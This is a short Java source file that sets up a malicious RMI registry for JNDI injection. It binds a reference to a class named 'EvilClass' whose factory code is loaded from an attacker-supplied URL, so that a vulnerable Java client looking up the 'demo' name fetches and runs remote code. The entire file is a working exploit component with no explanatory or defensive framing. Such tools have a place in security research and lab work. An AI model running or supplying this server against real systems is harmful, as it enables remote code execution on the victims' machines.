

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class BServer {
    public static void main(String args[]) throws Exception {
        String uri = "";
        if(args.length == 1) {
            uri = args[0];
        } else {
            uri = "http://127.0.0.1/demo.class";
        }
        System.out.println("[*]classFactoryLocation: " + uri);
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", uri);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'");
        registry.bind("demo", refObjWrapper);
    }
}